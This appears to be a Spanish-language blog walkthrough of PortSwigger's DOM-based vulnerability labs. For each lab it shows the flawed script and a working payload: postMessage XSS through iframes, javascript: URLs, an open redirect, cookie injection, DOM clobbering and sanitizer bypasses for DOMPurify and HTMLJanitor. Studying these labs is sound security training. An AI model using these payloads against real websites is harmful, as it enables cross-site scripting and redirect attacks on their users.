---
layout: single
title: DOM-Based Vulnerabilites - PortSwigger
excerpt: "All DOM-Based Vulnerabilites labs of PortSwigger."
date: 2025-08-11
classes: wide
header:
  teaser: /img2/images/portswigger.png
  teaser_home_page: true
  icon: /img2/images/burp.jpg
categories:
  - portswigger
  - Web
tags:
  - Burpsuite
  - DOM-Based
---


## Javascript Tips

- Ejecutar funciones dentro del iframe

```javascript
this.contentWindow.
```

- Ejecutar web messages

```javascript
postMessage(message, targetOrigin) // En targetOrigin podemos poner *
```

- Contenido en JSON

```javascript
JSON.stringify({type: 'load-channel',url: 'javascript:print()'})
```

- DOM clobbering 

```html
<a id=defaultAvatar></a>
<a id=defaultAvatar name=avatar href="http://test.com"></>
```

- Saltar el URL-encode de DOMPurify

```jvavascript
cid:&quot;
```

## DOM XSS using web messages || XSS DOM usando Web Messages

![](/img2/Pasted%20image%2020250810165843.png)

> Revisando el código fuente encontramos un script el cual usa el evento 'message' para recibir e insertar el contenido en el DOM.

![](/img2/Pasted%20image%2020250810170122.png)

> Con la función 'postMessage' podemos controlar el contenido que se inserta en el DOM.

![](/img2/Pasted%20image%2020250810170234.png)

> De esta forma logramos ejecutar el código javascript, sin embargo, tenemos que encontrar la forma de que la víctima ejecute la instrucción 'postMessage'.

![](/img2/Pasted%20image%2020250810170953.png)

> Con la propiedad 'this.contentWindow' podemos ejecutar la función 'postMessage' dentro del contenido del 'iframe'. Es importante indicar que el origen puede ser cualquiera con el * , dentro del 'postMessage'.

- Injection

```html
<iframe src="https://0a72002f038f4cf580cd038a00510073.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=0 onerror=print()>','*')">
```

## XSS DOM con Web Messages y URL JavaScript || DOM XSS using web messages and a JavaScript URL

![](/img2/Pasted%20image%2020250810172440.png)

> Revisando el código fuente vemos un script el cual vuelve a utilizar el evento 'message' para realizar un redirect al usuario. El problema está en la mala sanetización del contenido, el script está comprobando si existe las cadenas 'http:' o 'https' dentro del mensaje.

![](/img2/Pasted%20image%2020250810172903.png)

> Para saltar esta restricción el mensaje debe contener un 'http:' o 'https:'.

![](/img2/Pasted%20image%2020250810173028.png)

- Injection

```html
<iframe src="https://0a770011037c814881598fcc00ed005d.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print(\'http://\')','*')">
```

## XSS DOM con Web Messages y 'JSON.parse' || DOM XSS using web messages and JSON.parse

![](/img2/Pasted%20image%2020250810181932.png)

> El script recibe el contenido de 'message' y le aplica la función 'JSON.parse' para transformar nuestro string en un objeto JSON, una vez creado el objeto JSON busca por el valor de la clave 'type'. Sabiendo esto, vemos que el tipo 'load-channel' remplaza el valor de la clave 'url' por el atributo 'src' del iframe.

![](/img2/Pasted%20image%2020250810182617.png)

> Para facilitar el envío del contenido en JSON podemos usar la función 'JSON.stringify'.

![](/img2/Pasted%20image%2020250810181703.png)

- Injection

```html
<iframe src="https://0a2600ff03568431802403ac00fc0034.web-security-academy.net/" onload="this.contentWindow.postMessage(JSON.stringify({type: 'load-channel',url: 'javascript:print()'}), '*')">
```

## Redirección abierta basada en el DOM || DOM-based open redirection

![](/img2/Pasted%20image%2020250810191446.png)

> En el enlace 'Back to Blog' encontramos un evento 'onclick', el cual ejecuta una expresión regular sobre la url actual en la cual, si existe la palabra 'url' siguiendo de una url válida. Finalmente, ejecuta un redirect sobre el valor del parámetro 'url'.

![](/img2/Pasted%20image%2020250810191321.png)

![](/img2/Pasted%20image%2020250810191400.png)

- Injection

```javascript
&url=https://exploit-0a2000ca034d2e4a81db2f09010800ff.exploit-server.net/exploit
```


## Manipulación de cookies vía DOM || DOM-based cookie manipulation

![](/img2/Pasted%20image%2020250810204811.png)

![](/img2/Pasted%20image%2020250810204846.png)

> Encontramos un script el cual nos crea una nueva cookie con el valor de nuestra url. Esta cookie es usada en el enlace 'Last viewed product'

![](/img2/Pasted%20image%2020250810205149.png)

> Poniendo una comilla simple salimos del contexto del string. 

![](/img2/Pasted%20image%2020250810205411.png)

> Con la comilla simple escapamos del contexto del string y con el símbolo del menor cerramos la etiqueta 'a', lo cual nos permite insertar una etiqueta.

![](/img2/Pasted%20image%2020250810204517.png)

> Para que el XSS sea válido necesitamos hacer una redirección de la víctima para que se interprete la cookie de sesión modificada.

- Injection

```html
<iframe src="https://0a0a00c4048f4fc7809826ff00510060.web-security-academy.net/product?productId=4&'><script>print()</script>" onload="this.contentWindow.location=https://0a0a00c4048f4fc7809826ff00510060.web-security-academy.net/">
```

## XSS mediante clobbering en el DOM || Exploiting DOM clobbering to enable XSS

![](/img2/Pasted%20image%2020250811200752.png)

> Al recargar la web se ejecuta un script en el cual vemos que en una parte se está insertando una imagen. El script almacena la etiqueta con el id 'defaultAvatar' e inserta el contenido de 'avatar' en la imagen.

![](/img2/Pasted%20image%2020250811201651.png)

![](/img2/Pasted%20image%2020250811201747.png)

> En la sección de comentarios se nos permite insertar texto en HTML, podemos aprovechar eso e insertar una etiqueta con la id 'defaultAvatar', sin embargo, no conseguimos insertar contenido en 'avatar'.

![](/img2/Pasted%20image%2020250811202758.png)

![](/img2/Pasted%20image%2020250811202907.png)

> Para hacer referencia a 'avatar' podemos hacer uso de las HTMLCollection.

![](/img2/Pasted%20image%2020250811204040.png)

![](/img2/Pasted%20image%2020250811204137.png)

> Internamente JavaScript ejecuta la función 'toString()', la cual nos devuelve el valor del atributo 'href'.

```html
'<img class="avatar" src="testing123" onerror=alert(1)//">'
```

![](/img2/Pasted%20image%2020250811204532.png)

> Para poder insertar las comillas dobles y escapar del 'href' tenemos que hacer uso del protocolo 'cid', el cual evita que se use el URL-Encode en la librería 'domPurify'.

- Injection

```html
<a id=defaultAvatar></a>
<a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//"></>
```

## Bypass de filtros HTML con clobbering DOM || Clobbering DOM attributes to bypass HTML filters

![](/img2/Pasted%20image%2020250811231059.png)

![](/img2/Pasted%20image%2020250811231139.png)

> Revisando el código vemos que se está empleando una sanetización mediante la librería HTMLJanitor. En la sanetización se emplea una lista blanca, la cual nos permite introducir las etiquetas 'input' y 'form' con los atributos 'name', 'type' y 'value' para el 'input' y el atributo 'id' para el 'form'.

![](/img2/Pasted%20image%2020250811231729.png)

```html
<form id="myForm">
  <input id="myInput">
</form>
```

![](/img2/Pasted%20image%2020250811232741.png)

> Para entender la lógica que se emplea al borrar un atributo, reproducimos el comportamiento que haría la función 'node.attributes.length' sobre las etiquetas. La función crea un array llamado 'NamedNodeMap' el cual contiene todos los atributos de la etiqueta.

```html
<form id="myForm">
  <input id="attributes">
</form>
```

![](/img2/Pasted%20image%2020250811233430.png)

> Si cambiamos el 'id' de la etiqueta 'input' podemos emplear un clobbering, el cual engañará a la función 'node.attributes.length'.

![](/img2/Pasted%20image%2020250811233913.png)

![](/img2/Pasted%20image%2020250811233944.png)

> Aunque tengamos el XSS explotado tenemos que enviar el enlace a la víctima, el problema está en que a veces JavaScript necesita cargar el código antes de que se ejecute nuestra instrucción.

![](/img2/Pasted%20image%2020250811234538.png)

- Injection

```html
<iframe src="https://0a3a00d6047932b180e80d7c00020044.web-security-academy.net/post?postId=9" onload="setTimeout(() => this.src+='#x', 1000)">
```